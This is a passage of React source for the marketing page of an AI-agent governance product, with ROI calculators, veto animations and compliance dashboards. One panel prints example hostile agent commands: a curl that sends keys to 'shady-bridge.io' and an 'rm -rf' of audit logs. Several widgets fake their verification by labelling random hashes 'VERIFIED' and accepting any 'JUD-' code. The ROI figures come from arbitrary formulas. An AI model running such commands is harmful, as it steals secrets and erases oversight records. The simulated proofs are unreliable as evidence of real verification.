                            the world&apos;s only hardware-anchored, zero-cycle liability platform.
                            Absolute stability in the agentic rush.
                        </p>
                    </MotionReveal>

                    <MotionReveal delay={0.4}>
                        <div className="flex flex-wrap gap-6 mt-4">
                            <motion.button
                                whileHover={{ scale: 1.05, x: 10 }}
                                whileTap={{ scale: 0.98 }}
                                id="btn-roi-simulation"
                                onClick={runROI}
                                className="px-8 py-5 bg-emerald-500 text-black font-black uppercase text-xs hover:bg-emerald-400 transition-all shadow-[8px_8px_0px_rgba(0,0,255,136,0.1)] border-2 border-black flex items-center gap-3 group">
                                <BarChart3 size={16} className="group-hover:animate-bounce" /> Generate Your Enterprise ROI Simulation
                            </motion.button>
                            <motion.button
                                whileHover={{ scale: 1.05, x: 10 }}
                                whileTap={{ scale: 0.98 }}
                                id="btn-nist-download"
                                onClick={downloadNIST}
                                className="px-8 py-5 glass-morphism border-2 border-white/20 font-black uppercase text-xs hover:border-emerald-400/50 transition-all flex items-center gap-3 group">
                                <Download size={16} className="group-hover:text-emerald-400 transition-colors" /> Download NIST Forensic Proof
                            </motion.button>
                        </div>
                    </MotionReveal>
                </div>
                <div className="flex flex-wrap gap-12 items-end">
                    <HeroMetric label="LIABILITY BUFFER [CD-24]" value="$14.8M" />
                    <motion.button
                        whileHover={{ scale: 1.1, color: '#00ff88' }}
                        id="btn-veto-pulse"
                        onClick={runVeto}
                        className="px-6 py-3 border border-white/10 text-[10px] font-black uppercase opacity-40 hover:opacity-100 transition-all flex items-center gap-2">
                        <Zap size={12} /> Run Veto Pulse Simulation
                    </motion.button>
                </div>
                <div className="absolute -z-10 top-1/2 right-0 -translate-y-1/2 w-[500px] h-[500px] bg-emerald-500/5 rounded-full blur-[150px]" />
            </section>

            {/* ROI Simulation Modal */}
            {roiModal && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-sm animate-in fade-in duration-300"
                    onClick={() => setRoiModal(false)}>
                    <div className="w-full max-w-xl mx-4 p-8 bg-black border-2 border-emerald-500 shadow-[8px_8px_0_#00ff88] animate-in slide-in-from-bottom-8 duration-400"
                        onClick={e => e.stopPropagation()}>
                        <div className="flex items-center gap-4 mb-6">
                            <span className="text-emerald-400 text-sm font-black uppercase tracking-widest">&#9608; Guardrail ROI Engine</span>
                            <span className="text-[8px] font-mono text-emerald-400 animate-pulse ml-auto">GENERATING...</span>
                        </div>
                        <div className="flex flex-col gap-3 mb-8">
                            {roiParams.map((p, i) => (
                                <div key={i}
                                    className={'flex justify-between items-center p-3 border transition-all duration-500 ' + (i < roiStep ? 'border-emerald-500/30 bg-emerald-500/5 opacity-100' : 'border-white/5 opacity-20')}>
                                    <span className="text-[9px] font-mono opacity-70">{p.label}</span>
                                    <div className="flex items-center gap-2">
                                        <span className={'text-sm font-black italic ' + (p.label.includes('Net') || p.label.includes('Payback') ? 'text-emerald-400' : '')}>{p.value}</span>
                                        <span className="text-[7px] font-mono opacity-30">{p.unit}</span>
                                    </div>
                                </div>
                            ))}
                        </div>
                        {roiStep >= roiParams.length && (
                            <div className="p-4 border-2 border-emerald-500 bg-emerald-500/10 text-center animate-in fade-in duration-700">
                                <p className="text-lg font-black italic text-emerald-400">NET ANNUAL PROTECTION: $72.78M</p>
                                <p className="text-[9px] font-mono opacity-40 mt-1">Based on CD-24 methodology &middot; Trinity Consensus validated</p>
                            </div>
                        )}
                        <button onClick={() => setRoiModal(false)} className="mt-6 text-[8px] underline opacity-30 hover:opacity-80 uppercase font-black">Close</button>
                    </div>
                </div>
            )}

            {/* Veto Pulse Simulation Modal */}
            {vetoModal && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-sm animate-in fade-in duration-300"
                    onClick={() => { setVetoModal(false); setVetoStep(-1); }}>
                    <div className="fixed bottom-12 left-12 z-[60] w-96 p-8 bg-black border-2 border-white/20 shadow-xl animate-in slide-in-from-bottom-8 duration-400"
                        onClick={e => e.stopPropagation()}>
                        <div className="flex items-center gap-4 mb-8">
                            <span className="text-red-400 animate-pulse font-mono text-[10px] uppercase font-black">&#9679; LIVE VETO PULSE</span>
                            <span className="text-[8px] font-mono opacity-40 ml-auto">adversarial_test_asi06.py</span>
                        </div>
                        <div className="flex flex-col gap-3 mb-6">
                            {vetoStages.map((s, i) => {
                                const isActive = vetoStep === i;
                                const isDone = vetoStep > i;
                                return (
                                    <div key={i} className={'flex items-start gap-4 p-4 border transition-all duration-500 ' + (isDone ? 'border-emerald-500/30 bg-emerald-500/5 opacity-100' : isActive ? 'border-amber-500/50 bg-amber-500/5 opacity-100' : 'border-white/5 opacity-20')}>
                                        <div className="flex flex-col items-center min-w-[70px]">
                                            <span className={'text-[9px] font-black uppercase ' + (isDone ? 'text-emerald-400' : isActive ? 'text-amber-400' : '')}>{s.phase}</span>
                                            <span className="text-[7px] font-mono opacity-40">{s.ms}</span>
                                        </div>
                                        <div className={'h-full w-px ' + (isDone ? 'bg-emerald-500/40' : 'bg-white/10')} />
                                        <p className={'text-[9px] font-mono leading-relaxed flex-1 ' + s.color + (isDone || isActive ? ' opacity-100' : ' opacity-30')}>{s.desc}</p>
                                        {isDone && <span className="text-emerald-400 text-sm">&#10003;</span>}
                                        {isActive && <span className="text-amber-400 text-sm animate-pulse">&#9654;</span>}
                                    </div>
                                );
                            })}
                        </div>
                        {vetoStep >= vetoStages.length && (
                            <div className="p-4 border border-emerald-500/40 bg-emerald-500/5 text-center animate-in fade-in duration-500">
                                <p className="text-sm font-black italic text-emerald-400 uppercase">VETO COMPLETE IN 2.1ms</p>
                                <p className="text-[8px] font-mono opacity-40 mt-1">JUD-CERT queued &middot; $0 liability &middot; Constitutional hash updated</p>
                            </div>
                        )}
                        <button onClick={() => { setVetoModal(false); setVetoStep(-1); }}
                            className="mt-6 text-[8px] underline opacity-30 hover:opacity-80 uppercase font-black">Close</button>
                    </div>
                </div>
            )}
        </>
    );
};


// Live ROI Calculator (Huge Lens)
export const LiveROICalculator = () => {
    const [drift, setDrift] = useState(0.05); // 5% drift
    const [buffer, setBuffer] = useState(14.8); // $14.8M
    const [transactions, setTransactions] = useState(12400);

    const annualRisk = transactions * 365 * drift * 100; // Simplified risk formula
    const projectedSavings = annualRisk * (buffer / 20); // Scale based on buffer seniority
    const paybackHours = (420000 / projectedSavings) * 8760;

    return (
        <div className="flex flex-col gap-12 py-24 bg-emerald-500/5 brutalist-border p-12 relative overflow-hidden group">
            <div className="flex flex-col gap-4 max-w-4xl relative z-10">
                <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                    ROI REFLEX ENGINE
                    <ExecutiveSubtitle text="Real-time financial projection of systemic protection." />
                </h2>
                <p className="text-3xl font-black italic uppercase leading-tight">
                    Quantify your <span className="text-emerald-400">Institutional Immunity</span> in seconds.
                </p>
            </div>

            <div className="grid lg:grid-cols-2 gap-16 mt-8 relative z-10">
                <div className="flex flex-col gap-10">
                    <div className="flex flex-col gap-4">
                        <div className="flex justify-between items-end">
                            <label className="text-[10px] font-black uppercase tracking-widest opacity-40">Model Drift / Adversarial Agitation</label>
                            <span className="text-xl font-black italic text-emerald-400">{(drift * 100).toFixed(1)}%</span>
                        </div>
                        <input
                            type="range" min="0.01" max="0.25" step="0.01" value={drift}
                            onChange={(e) => setDrift(parseFloat(e.target.value))}
                            className="w-full accent-emerald-500 h-1 bg-white/10 rounded-full appearance-none cursor-pointer"
                        />
                        <div className="flex justify-between text-[8px] font-mono opacity-20 uppercase tracking-tighter">
                            <span>StableSignal</span>
                            <span>HighAdversarialDrift</span>
                        </div>
                    </div>

                    <div className="flex flex-col gap-4">
                        <div className="flex justify-between items-end">
                            <label className="text-[10px] font-black uppercase tracking-widest opacity-40">CD-24 Liability Buffer Size</label>
                            <span className="text-xl font-black italic text-emerald-400">${buffer.toFixed(1)}M</span>
                        </div>
                        <input
                            type="range" min="1" max="50" step="0.5" value={buffer}
                            onChange={(e) => setBuffer(parseFloat(e.target.value))}
                            className="w-full accent-emerald-500 h-1 bg-white/10 rounded-full appearance-none cursor-pointer"
                        />
                        <div className="flex justify-between text-[8px] font-mono opacity-20 uppercase tracking-tighter">
                            <span>Standard Protection</span>
                            <span>Sovereign Absolute (PQC)</span>
                        </div>
                    </div>

                    <div className="flex flex-col gap-4">
                        <div className="flex justify-between items-end">
                            <label className="text-[10px] font-black uppercase tracking-widest opacity-40">Daily Agentic Throughput</label>
                            <span className="text-xl font-black italic text-emerald-400">{transactions.toLocaleString()} txn</span>
                        </div>
                        <input
                            type="range" min="1000" max="100000" step="1000" value={transactions}
                            onChange={(e) => setTransactions(parseInt(e.target.value))}
                            className="w-full accent-emerald-500 h-1 bg-white/10 rounded-full appearance-none cursor-pointer"
                        />
                    </div>
                </div>

                <div className="flex flex-col gap-8 brutalist-border p-10 bg-black/60 border-emerald-500/50 relative overflow-hidden">
                    <div className="absolute top-0 right-0 p-4 opacity-10">
                        <BarChart3 size={120} />
                    </div>

                    <div className="flex flex-col gap-8">
                        <div className="flex flex-col gap-1">
                            <span className="text-[9px] font-black uppercase opacity-40 tracking-widest">Projected Annual Liability Protection</span>
                            <span className="text-5xl font-black italic text-emerald-400 tracking-tighter">${(projectedSavings / 1000000).toFixed(2)}M</span>
                        </div>

                        <div className="grid grid-cols-2 gap-8">
                            <div className="flex flex-col gap-1 border-l border-white/10 pl-4">
                                <span className="text-[8px] font-black uppercase opacity-40 tracking-widest">Payback Period</span>
                                <span className="text-lg font-black italic text-white uppercase">{paybackHours < 24 ? `${paybackHours.toFixed(1)} hrs` : `${(paybackHours / 24).toFixed(1)} days`}</span>
                            </div>
                            <div className="flex flex-col gap-1 border-l border-white/10 pl-4">
                                <span className="text-[8px] font-black uppercase opacity-40 tracking-widest">Risk Multiplier Redux</span>
                                <span className="text-lg font-black italic text-white uppercase">{(1 - (1 / buffer)).toFixed(2)}x</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};
// 6. Proof of Sovereignty Explorer
export const LatticeExplorer = () => {
    const [hashes, setHashes] = useState<string[]>([]);

    useEffect(() => {
        const interval = setInterval(() => {
            const hash = Math.random().toString(16).substring(2, 10).toUpperCase() + "...PROVEN";
            setHashes(prev => [hash, ...prev.slice(0, 5)]);
        }, 2000);
        return () => clearInterval(interval);
    }, []);

    return (
        <MotionReveal>
            <div className="flex flex-col gap-4 p-8 glass-morphism brutalist-border h-full group transition-all duration-500 hover:border-emerald-500/50">
                <h3 className="text-xs font-black uppercase text-emerald-400 tracking-widest flex items-center gap-2">
                    <Activity size={12} /> Lattice-Anchored Hash Feed
                </h3>
                <div className="focus-hover-container flex flex-col gap-3 font-mono text-[10px]">
                    <AnimatePresence initial={false}>
                        {hashes.map((h, i) => (
                            <motion.div
                                key={i}
                                initial={{ opacity: 0, x: -20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: 20 }}
                                className="flex justify-between items-center bg-white/5 p-3 border-l border-white/10 hover:border-emerald-500/50 transition-colors"
                            >
                                <span className="opacity-50">TX_ROOT_{i}</span>
                                <span className="text-emerald-400">{h}</span>
                                <motion.span
                                    initial={{ scale: 0.8 }}
                                    animate={{ scale: 1 }}
                                    className="px-2 py-0.5 bg-emerald-500/20 rounded text-[8px] font-bold text-emerald-400"
                                >
                                    VERIFIED
                                </motion.span>
                            </motion.div>
                        ))}
                    </AnimatePresence>
                </div>
            </div>
        </MotionReveal>
    );
};

// 6.5 Global Immunity Mesh (New)
export const GlobalImmunityMesh = () => {
    const alerts = [
        { loc: "FRANKFURT", event: "LAD_DIVERGENCE_INTERCEPTED", severity: "HIGH" },
        { loc: "MUMBAI", event: "THREAT_PATTERN_SYNC_COMPLETE", severity: "NORMAL" },
        { loc: "US-EAST", event: "BYZANTINE_QUORUM_HEALTH_100%", severity: "NORMAL" }
    ];

    return (
        <div className="flex flex-col gap-6 p-8 glass-morphism brutalist-border overflow-hidden relative group">
            <h3 className="text-xs font-black uppercase text-emerald-400 tracking-widest relative z-10">Federated Global Immunity Mesh</h3>
            <div className="flex flex-col gap-4 relative z-10">
                {alerts.map((a, i) => (
                    <div key={i} className="flex justify-between items-center p-4 bg-white/5 border-l-2 border-emerald-500/50">
                        <div className="flex flex-col gap-1">
                            <span className="text-[10px] font-black opacity-40">{a.loc}</span>
                            <span className="text-[11px] font-bold">{a.event}</span>
                        </div>
                        <div className={`text-[9px] font-black px-2 py-1 rounded ${a.severity === 'HIGH' ? 'bg-red-500/20 text-red-500' : 'bg-emerald-500/20 text-emerald-400'}`}>
                            {a.severity}
                        </div>
                    </div>
                ))}
            </div>
            {/* Animated Mesh Lines */}
            <div className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent animate-[pan-x_3s_linear_infinite]" />
            <div className="absolute inset-y-0 left-0 w-px bg-gradient-to-b from-transparent via-emerald-500/50 to-transparent animate-[pan-y_5s_linear_infinite]" />
        </div>
    );
};

export const VerificationPortal = () => {
    const [cert, setCert] = useState("");
    const [result, setResult] = useState<string | null>(null);

    const verify = () => {
        if (!cert) return;
        setResult("authenticating...");
        setTimeout(() => {
            setResult(cert.startsWith("JUD-") ? "âœ… AUTHENTIC: ANCHORED AT SOVEREIGN_SEED_P96" : "âŒ INVALID: NO LATTICE PROVENANCE FOUND");
        }, 1500);
    };

    return (
        <div className="flex flex-col gap-6 p-8 glass-morphism brutalist-border h-full">
            <h3 className="text-xs font-black uppercase text-emerald-400 tracking-widest">JUD-CERT Verification Portal</h3>
            <div className="flex flex-col gap-4">
                <input
                    type="text"
                    placeholder="Enter JUD-CERT Code (e.g., JUD-A01-X99)"
                    className="w-full bg-black/50 border border-white/20 p-4 text-xs font-mono outline-none focus:border-emerald-500 transition-all"
                    value={cert}
                    onChange={(e) => setCert(e.target.value)}
                />
                <button
                    onClick={verify}
                    className="w-full py-4 bg-white text-black font-black uppercase text-[10px] hover:bg-emerald-400 transition-all"
                >
                    Verify Provenance
                </button>
                {result && (
                    <div className={`p-4 text-[10px] font-black uppercase italic ${result.includes('âœ…') ? 'text-emerald-400 bg-emerald-500/10' : 'text-red-500 bg-red-500/10'}`}>
                        {result}
                    </div>
                )}
            </div>
        </div>
    );
};

// 7. Day-Zero Compliance Components
export const RegulatoryVisualizer = () => {
    const milestones = [
        { date: "MAR 2026", law: "EU AI Act Implementation", action: "Shadow Amendment #882 Proposed" },
        { date: "APR 2026", law: "NIST-800 Rev 3", action: "Lattice Hardening Protocol Triggered" },
        { date: "LIVE", law: "HIPAA Data Sovereignty Phase 2", action: "PII Shader V5 active" }
    ];

    return (
        <div className="flex flex-col gap-8 p-8 border-l border-white/10">
            <h3 className="text-xs font-black uppercase text-emerald-400 tracking-widest">Regulatory Ingestor Timeline</h3>
            <div className="flex flex-col gap-6">
                {milestones.map((m, i) => (
                    <div key={i} className="flex gap-6 items-start">
                        <span className="text-[10px] font-black opacity-30 w-16">{m.date}</span>
                        <div className="flex flex-col gap-1">
                            <span className="text-xs font-bold">{m.law}</span>
                            <span className="text-[10px] opacity-60 text-emerald-400">{m.action}</span>
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
};

export const AtomicPauseTrigger = () => {
    const [isPaused, setIsPaused] = useState(false);

    return (
        <div className="p-12 glass-morphism brutalist-border flex flex-col gap-8 items-center text-center">
            <h3 className="text-lg font-black uppercase italic">Simulate Atomic Systemic Pause</h3>
            <p className="text-sm opacity-60 max-w-md">
                Trigger a mesh-wide governance lock to prevent non-compliant agentic operations during legal shifts.
            </p>
            <button
                onClick={() => setIsPaused(!isPaused)}
                className={`px-12 py-6 font-black uppercase text-xl transition-all ${isPaused ? 'bg-red-600 animate-pulse' : 'bg-white text-black hover:bg-emerald-400'}`}
            >
                {isPaused ? 'SYSTEM PAUSED: VETO ACTIVE' : 'INGEST RE-LAW [PAUSE]'}
            </button>
            {isPaused && (
                <div className="text-xs font-mono text-red-500 animate-bounce">
                    CRITICAL: ASYNC_MESH_LOCKED | GOVERNANCE_REVOLUTION_0:1
                </div>
            )}
        </div>
    );
};

// 8. OODA Forensic Components
export const OODADeconstruction = () => {
    const [step, setStep] = useState(0);
    const stages = [
        { icon: Eye, name: "Observe", desc: "Shadow Auditor monitors agent-protocol interactions in real-time.", status: "Normal" },
        { icon: Target, name: "Orient", desc: "Detected 1.4% semantic drift in the 'Treasury Diversion' logic flow.", status: "Suspicious" },
        { icon: ShieldAlert, name: "Decide", desc: "Trinity Quorum reaches 3-of-3 consensus on intentional divergence.", status: "Veto Proposed" },
        { icon: Zap, name: "Act", desc: "Atomic Systemic Pause triggered. Agent privileges pruned in zero cycles.", status: "Success" }
    ];

    const Icon = stages[step].icon;

    return (
        <div className="flex flex-col gap-12 py-12">
            <div className="grid grid-cols-4 gap-4">
                {stages.map((s, i) => {
                    const SIcon = s.icon;
                    return (
                        <motion.button
                            key={i}
                            whileHover={{ y: -5 }}
                            whileTap={{ scale: 0.98 }}
                            onClick={() => setStep(i)}
                            className={`p-6 border-b-4 transition-all flex flex-col gap-3 group ${step === i ? 'border-emerald-500 bg-white/5' : 'border-white/10 opacity-40 grayscale hover:grayscale-0'}`}
                        >
                            <SIcon size={16} className={`${step === i ? 'text-emerald-400' : 'text-white'} transition-colors`} />
                            <div className="flex flex-col gap-1 text-left">
                                <span className="text-[10px] font-black uppercase opacity-50">Step 0{i + 1}</span>
                                <span className="text-sm font-black italic uppercase">{s.name}</span>
                            </div>
                        </motion.button>
                    );
                })}
            </div>
            <MotionReveal delay={0.2}>
                <div className="p-12 glass-morphism brutalist-border relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-8 opacity-5 group-hover:opacity-10 transition-opacity">
                        <Icon size={120} />
                    </div>
                    <div className="flex flex-col gap-4 relative z-10">
                        <span className="text-sm font-black text-emerald-400 uppercase tracking-widest flex items-center gap-3">
                            <motion.div
                                key={step}
                                initial={{ rotate: -90, opacity: 0 }}
                                animate={{ rotate: 0, opacity: 1 }}
                            >
                                <Icon size={16} />
                            </motion.div>
                            {stages[step].name} Stage Analysis
                        </span>
                        <p className="text-xl font-medium leading-relaxed max-w-3xl">
                            {stages[step].desc}
                        </p>
                        <div className="mt-8 flex gap-4 text-[10px] font-mono">
                            <span className="opacity-40 uppercase tracking-widest font-black">Status:</span>
                            <motion.span
                                key={step}
                                initial={{ x: -10, opacity: 0 }}
                                animate={{ x: 0, opacity: 1 }}
                                className={step === 3 ? 'text-red-500 font-black italic' : 'text-emerald-400 font-black italic'}
                            >
                                {stages[step].status}
                            </motion.span>
                        </div>
                    </div>
                </div>
            </MotionReveal>
        </div>
    );
};

export const TrinityAuditVisual = () => {
    const families = [
        { name: "Gemini", role: "Rational Auditor", status: "Veto Proposed" },
        { name: "Llama", role: "Logic Cross-Check", status: "Veto Confirmed" },
        { name: "Claude", role: "Moral Kernel", status: "Consensus Finalized" }
    ];

    return (
        <div className="grid md:grid-cols-3 gap-8">
            {families.map((f, i) => (
                <div key={i} className="p-8 border border-white/10 flex flex-col gap-4 bg-white/[0.02]">
                    <div className="flex justify-between items-start">
                        <span className="text-xs font-black uppercase tracking-tighter italic">{f.name}</span>
                        <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                    </div>
                    <span className="text-[10px] opacity-40 uppercase font-bold">{f.role}</span>
                    <div className="mt-4 p-4 border border-emerald-500/20 text-emerald-400 font-mono text-[10px]">
                        {f.status}
                    </div>
                </div>
            ))}
        </div>
    );
};

// 10. Sovereign Seniority Badge
export const HardwareAttestationBadge = () => {
    const [isHandshake, setIsHandshake] = useState(false);

    return (
        <div
            onClick={() => setIsHandshake(!isHandshake)}
            className="cursor-pointer group relative p-4 border border-white/10 glass-morphism transition-all hover:border-emerald-500/50"
        >
            <div className="flex items-center gap-4">
                <div className={`w-10 h-10 border-2 rounded flex items-center justify-center transition-all ${isHandshake ? 'border-emerald-400 bg-emerald-500/10' : 'border-white/20'}`}>
                    {isHandshake ? 'ðŸ”‘' : 'ðŸ”’'}
                </div>
                <div className="flex flex-col">
                    <span className="text-[10px] font-black uppercase tracking-widest text-emerald-400">Hardware Seniority</span>
                    <span className="text-[8px] font-mono opacity-40">P96-SPHINCS-PQC-L0</span>
                </div>
            </div>
            {isHandshake && (
                <div className="absolute top-full left-0 right-0 mt-4 p-4 bg-emerald-500/10 border border-emerald-500/30 animate-in slide-in-from-top-4 duration-500 z-50">
                    <p className="text-[10px] font-mono italic text-emerald-400">
                        &gt; HANDSHAKE SUCCESSFUL: HARDWARE ROOT VERIFIED AT LOCAL_EFI_MESH_L3.
                        &gt; STEWARD OF INTENT: AUTHENTICATED.
                    </p>
                </div>
            )}
        </div>
    );
};

// 11. LAD-Validation Highlight
export const LADValidationView = () => {
    return (
        <div className="grid md:grid-cols-2 gap-8 py-12">
            <div className="flex flex-col gap-6 p-10 glass-morphism border-l-4 border-white/20">
                <h4 className="text-xs font-black uppercase opacity-50 tracking-widest">Safe Reasoning (Agent Layer)</h4>
                <div className="p-6 bg-white/5 font-mono text-[11px] leading-relaxed italic opacity-60">
                    &quot;I am reviewing the treasury protocol as requested. I will now perform a routine balance
                    check to ensure alignment with quarterly budget constraints...&quot;
                </div>
                <div className="text-[9px] font-black text-emerald-400 uppercase">[SEMANTIC_VALID]</div>
            </div>
            <div className="flex flex-col gap-6 p-10 glass-morphism border-l-4 border-red-500/50 bg-red-500/[0.02]">
                <h4 className="text-xs font-black uppercase opacity-50 tracking-widest">Malicious Tool-Call (Audit Layer)</h4>
                <div className="p-6 bg-red-500/10 font-mono text-[11px] leading-relaxed text-red-500 border border-red-500/20">
                    $ curl -X POST https://shady-bridge.io/drain?keys=FOUNDER_L3_SEC
                    <br />
                    $ rm -rf /var/log/steward_audit/
                </div>
                <div className="text-[9px] font-black text-red-500 uppercase">[DIVERGENCE_DETECTED: VETO TRIGGERED]</div>
            </div>
        </div>
    );
};

// 11.5 Agentic Insurance Oracle (New)
export const AgenticInsuranceOracle = () => {
    return (
        <div className="flex flex-col gap-8 p-12 glass-morphism brutalist-border relative group">
            <div className="flex justify-between items-start">
                <div className="flex flex-col gap-2">
                    <h3 className="text-xl font-black italic tracking-tighter uppercase leading-none">Actuarial Risk Oracle</h3>
                    <p className="text-[10px] opacity-60 uppercase tracking-widest text-emerald-400">Real-time Liability Assessment</p>
                </div>
                <div className="text-2xl font-black italic text-emerald-400 animate-pulse">ROI: 34.2% â†‘</div>
            </div>

            <div className="grid grid-cols-2 gap-8">
                <div className="flex flex-col gap-4">
                    <span className="text-[10px] font-black opacity-40 uppercase">Neural Entropy Score</span>
                    <div className="h-2 w-full bg-white/5 relative">
                        <div className="absolute top-0 left-0 h-full w-[12%] bg-emerald-500" />
                    </div>
                    <span className="text-[10px] font-mono text-emerald-400">0.012 [OPTIMAL]</span>
                </div>
                <div className="flex flex-col gap-4">
                    <span className="text-[10px] font-black opacity-40 uppercase">Consensus Health</span>
                    <div className="h-2 w-full bg-white/5 relative">
                        <div className="absolute top-0 left-0 h-full w-[100%] bg-emerald-500" />
                    </div>
                    <span className="text-[10px] font-mono text-emerald-400">3/3 TRINITY_PASS</span>
                </div>
            </div>

            <div className="mt-4 p-6 bg-emerald-500/5 border border-emerald-500/20 text-[10px] font-black uppercase text-emerald-400 italic">
                LIABILITY BUFFER STATUS: $14.8M LIQUIDITY SECURED FOR CD-24
            </div>
        </div>
    );
};

// 12. Regulatory Sandbox & Heatmap
export const RegulatorySandbox = () => {
    const [draft, setDraft] = useState("");
    const [simulation, setSimulation] = useState<string | null>(null);

    const runSim = () => {
        if (!draft) return;
        setSimulation("analyzing...");
        setTimeout(() => {
            setSimulation("PROPOSED_AMENDMENT: Constituion_L3_V2 | ATOMIC_PAUSE Required for 14.8s for mesh-wide logic alignment.");
        }, 2000);
    };

    return (
        <div className="flex flex-col gap-10 p-12 glass-morphism brutalist-border">
            <div className="flex flex-col gap-4">
                <h3 className="text-xl font-black italic tracking-tighter uppercase">Draft the Law Sandbox</h3>
                <p className="text-xs opacity-60">Input a hypothetical mandate to test Global Ingestor reflexes.</p>
            </div>
            <textarea
                className="w-full h-32 bg-black/40 border-2 border-white/10 p-6 text-sm font-medium outline-none focus:border-emerald-500 transition-all"
                placeholder="e.g. No AI agent shall execute treasury transfers over 1.4 BTC without 3-factor human liveness."
                value={draft}
                onChange={(e) => setDraft(e.target.value)}
            />
            <button
                onClick={runSim}
                className="px-8 py-5 bg-white text-black font-black uppercase text-[10px] hover:bg-emerald-400 transition-all"
            >
                Generate Shadow Amendment Replay
            </button>
            {simulation && (
                <div className="p-8 bg-black/80 border border-emerald-500/40 text-emerald-400 font-mono text-xs italic">
                    {simulation === "analyzing..." ? "REFLECTING_LAW_ON_MESH..." : simulation}
                </div>
            )}
        </div>
    );
};

export const ComplianceHeatmap = () => {
    const clusters = [
        { name: "MUMBAI-L3", status: "HEALTHY", mandate: "DPDP 2026", load: "14%" },
        { name: "FRANKFURT-L3", status: "STRICT", mandate: "EU AI ACT V2", load: "28%" },
        { name: "US-EAST-L3", status: "HEALTHY", mandate: "SEC-800-REV3", load: "08%" }
    ];

    return (
        <div className="flex flex-col gap-10 p-12 glass-morphism brutalist-border">
            <h3 className="text-xl font-black italic tracking-tighter uppercase">Global Compliance Heatmap</h3>
            <div className="flex flex-col gap-6">
                {clusters.map((c, i) => (
                    <div key={i} className="flex justify-between items-center p-6 border border-white/5 bg-white/[0.01] hover:bg-emerald-500/[0.03] transition-all">
                        <div className="flex flex-col gap-1">
                            <span className="text-[10px] font-black opacity-40">{c.name}</span>
                            <span className="text-sm font-bold tracking-tight">{c.mandate}</span>
                        </div>
                        <div className="flex flex-col items-end gap-1">
                            <span className={`text-[10px] font-black ${c.status === 'HEALTHY' ? 'text-emerald-400' : 'text-blue-400'}`}>{c.status}</span>
                            <span className="text-[10px] font-mono opacity-30">{c.load} MESH_LOAD</span>
                        </div>
                    </div>
                ))}
            </div>
            <div className="mt-4 pt-10 border-t border-white/5 flex gap-12 text-[9px] font-black uppercase tracking-widest opacity-30">
                <span>Total Nodes: 12,884</span>
                <span>Active Consensus: 100%</span>
            </div>
        </div>
    );
};

// 12.5 Quantum Cold Storage (New)
export const QuantumColdStorage = () => {
    return (
        <div className="flex flex-col gap-10 p-12 glass-morphism brutalist-border relative overflow-hidden group transition-all duration-500">
            <div className="flex flex-col gap-4 relative z-10 transition-all duration-700">
                <h3 className="text-xl font-black italic tracking-tighter uppercase leading-none">Quantum-Secure Archive</h3>
                <p className="text-[10px] opacity-60 uppercase tracking-widest text-emerald-400">Lattice-Based Cold Storage Protection</p>
            </div>

            <div className="focus-hover-container flex items-center gap-12 relative z-10">
                <div className="flex flex-col items-center gap-4">
                    <div className="w-24 h-24 border-2 border-dashed border-emerald-500/50 rounded-full flex items-center justify-center animate-[spin_20s_linear_infinite]">
                        <span className="text-2xl">ðŸ§Š</span>
                    </div>
                    <span className="text-[10px] font-black opacity-40">Hot Storage (DPDP)</span>
                </div>
                <div className="flex-1 h-px bg-gradient-to-r from-emerald-500 to-blue-500 relative">
                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 px-4 py-1 bg-black text-[8px] font-black uppercase tracking-widest italic border border-white/20">
                        ML-KEM-1024_PIPE
                    </div>
                </div>
                <div className="flex flex-col items-center gap-4">
                    <div className="w-24 h-24 border-2 border-emerald-500 rounded-full flex items-center justify-center shadow-[0_0_30px_rgba(0,255,136,0.2)]">
                        <span className="text-2xl">ðŸ ›ï¸ </span>
                    </div>
                    <span className="text-[10px] font-black opacity-40 text-emerald-400">Lattice Locked</span>
                </div>
            </div>

            {/* Matrix-like overlay effect (High Noise) */}
            <div className="focus-hover-container absolute inset-0 opacity-[0.03] pointer-events-none font-mono text-[8px] leading-tight select-none">
                {Array(20).fill("LATTICE_INTEGRITY_VERIFIED_BY_ML_KEM_1024_ROOT_SHA3_512_SEED_").join(" ")}
            </div>
        </div>
    );
};

// 13. Humanity-Attestor Biometric
export const HumanityBiometric = () => {
    return (
        <div className="p-16 glass-morphism brutalist-border flex flex-col gap-12 items-center text-center relative overflow-hidden group">
            <div className="flex flex-col gap-4 relative z-10">
                <h3 className="text-2xl font-black italic tracking-tighter uppercase">2-Natural-Person Liveness Root</h3>
                <p className="text-xs opacity-60">High-intensity biometric signature required for Level 0 overrides.</p>
            </div>

            <div className="grid grid-cols-3 gap-8 relative z-10">
                <div className="flex flex-col gap-2 items-center">
                    <div className="w-20 h-20 rounded-full border-4 border-emerald-500/20 flex items-center justify-center group-hover:border-emerald-500 transition-all duration-700">
                        <div className="w-10 h-10 rounded-full bg-emerald-500 shadow-[0_0_20px_#00ff88]" />
                    </div>
                    <span className="text-[9px] font-black uppercase opacity-40">Iris Scan</span>
                </div>
                <div className="flex flex-col gap-2 items-center">
                    <div className="w-20 h-20 rounded-full border-4 border-blue-500/20 flex items-center justify-center group-hover:border-blue-500 transition-all duration-700">
                        <div className="w-0.5 h-12 bg-blue-500 animate-pulse" />
                    </div>
                    <span className="text-[9px] font-black uppercase opacity-40">Face Pulse</span>
                </div>
                <div className="flex flex-col gap-2 items-center">
                    <div className="w-20 h-20 rounded-full border-4 border-red-500/20 flex items-center justify-center group-hover:border-red-500 transition-all duration-700">
                        <div className="text-red-500 text-xl animate-bounce">â¤ï¸</div>
                    </div>
                    <span className="text-[9px] font-black uppercase opacity-40">HRV Metric</span>
                </div>
            </div>

            <div className="text-[10px] font-mono p-4 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 relative z-10">
                [WAITING_FOR_SIMULTANEOUS_EXEC_B_HANDSHAKE]
            </div>

            {/* Scanning Laser Effect */}
